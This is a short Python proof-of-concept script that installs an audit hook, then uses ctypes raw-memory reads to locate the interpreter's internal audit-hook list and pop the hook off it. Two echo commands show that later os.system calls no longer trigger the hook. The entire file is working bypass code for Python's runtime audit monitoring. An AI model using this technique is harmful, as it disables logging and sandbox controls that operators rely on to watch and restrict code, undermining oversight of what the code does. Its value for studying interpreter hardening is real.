#!audit_hook_head_finder

### POC.py
### Find the offset to pop the audit hook
### and show to procession

from audit_hook_head_finder import print_all, get_interp_audit_hook_ptr_addr
import sys, ctypes, os

sys.addaudithook((lambda x: lambda *_: x("audit hook triggered!"))(print))

print_all()
# must be stored in a variable
obj = ctypes.byref(ctypes.py_object(()))
ptr_tp = ctypes.POINTER(ctypes.c_uint64)
# somewhere in stack
obj_addr = ctypes.cast(obj, ptr_tp).contents.value
# we also can use the line below without creating a temporary `obj` variable
assert ctypes.POINTER(ctypes.c_voidp)(ctypes.py_object(())).contents.value == obj_addr
# offset to get audit hook pointer address (which has a "fixed" offset)
audit_hook_ptr_offset = get_interp_audit_hook_ptr_addr() - obj_addr
print(f"audit_hook_ptr_offset={hex(audit_hook_ptr_offset)}")
# get audit hook as PyListObject
audit_hook: list = ctypes.cast(ctypes.cast(obj_addr + audit_hook_ptr_offset, ptr_tp).contents.value, ctypes.py_object).value
print(len(audit_hook))


# - POC - 

os.system("echo 'test audit hook -- this will trigger hook'")

audit_hook.pop()

os.system("echo 'test audit hook -- this will not'")